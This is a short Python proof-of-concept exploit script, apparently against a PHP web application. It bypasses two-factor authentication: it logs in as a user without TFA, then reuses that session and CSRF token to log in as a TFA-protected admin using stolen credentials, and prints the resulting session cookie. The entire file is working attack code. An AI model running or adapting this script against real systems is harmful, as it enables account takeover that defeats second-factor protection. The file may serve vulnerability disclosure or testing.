import requests
import re

###############################
## Author: Patrik Mayor		  #
###############################

########## FILL THIS ##########

url = "http://127.0.0.1/"

username = "normaluser@example.com" 						# Username for the user without TFA
password = "normaluserpassword" 							# Password for the user without TFA

victim_username = "supersecureadminaccount"					# Username for the user who has TFA enabled
victim_password = "supersecureadminaccountpassword"		    # Password for the user who has TFA enabled

###############################

proxy = {} 													# OPTIONAL proxy setting, for example: {"http":"127.0.0.1:8080"}
session = requests.Session()



def get_csrf_token():
	response = session.get(url,proxies=proxy)
	regex = r'"hidden" value="(.*?)">\'\)\.attr\(\''
	csrf_search = re.search(regex, response.text, re.IGNORECASE)

	if csrf_search:
	    csrf_token = csrf_search.group(1)
	else:
		print("Could not get CSRF token, exiting...")
		exit()
	return csrf_token

token=get_csrf_token()
session.post(url,data={"login_user":username,"pass_user":password,"csrf_token":token},proxies=proxy)
response = session.post(url,data={"login_user":victim_username,"pass_user":victim_password,"csrf_token":token},allow_redirects=False,proxies=proxy)

if response.status_code == 302:
	print("PoC works!\n")
	print("PHPSESSID="+session.cookies["PHPSESSID"])
else:
	print("PoC does not work!")

